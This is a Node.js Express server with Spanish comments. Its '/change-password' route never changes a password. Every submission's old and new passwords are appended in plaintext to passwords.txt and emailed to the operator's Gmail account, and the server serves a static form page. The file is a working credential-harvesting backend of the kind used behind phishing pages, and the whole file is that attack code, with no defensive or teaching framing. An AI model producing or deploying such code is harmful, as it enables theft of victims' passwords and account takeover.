const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware para parsear el cuerpo de las solicitudes
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Ruta para manejar el envío del formulario
app.post('/change-password', (req, res) => {
    const { oldPassword, newPassword, confirmPassword } = req.body;

    // Guardar los datos en un archivo .txt
    const data = `Contraseña anterior: ${oldPassword}\nNueva contraseña: ${newPassword}\nConfirmar nueva contraseña: ${confirmPassword}\n\n`;
    fs.appendFile(path.join(__dirname, 'passwords.txt'), data, (err) => {
        if (err) {
            console.error('Error al guardar los datos:', err);
            return res.status(500).send('Error al guardar los datos');
        }
        console.log('Datos guardados en passwords.txt');
    });

    // Enviar correo electrónico
    const transporter = nodemailer.createTransport({
        service: 'gmail', // Usar Gmail como servicio
        auth: {
            user: 'tu_correo@gmail.com', // Tu correo
            pass: 'tu_contraseña', // Tu contraseña de aplicación (no la de tu cuenta)
        },
    });

    const mailOptions = {
        from: 'tu_correo@gmail.com',
        to: 'tu_correo@gmail.com', // Correo al que quieres que llegue
        subject: 'Cambio de contraseña solicitado',
        text: `Contraseña anterior: ${oldPassword}\nNueva contraseña: ${newPassword}\nConfirmar nueva contraseña: ${confirmPassword}`,
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error al enviar el correo:', error);
            return res.status(500).send('Error al enviar el correo');
        }
        console.log('Correo enviado:', info.response);
        res.send('Cambio de contraseña solicitado. Revisa tu correo.');
    });
});

// Servir archivos estáticos (HTML, CSS)
app.use(express.static('public'));

app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});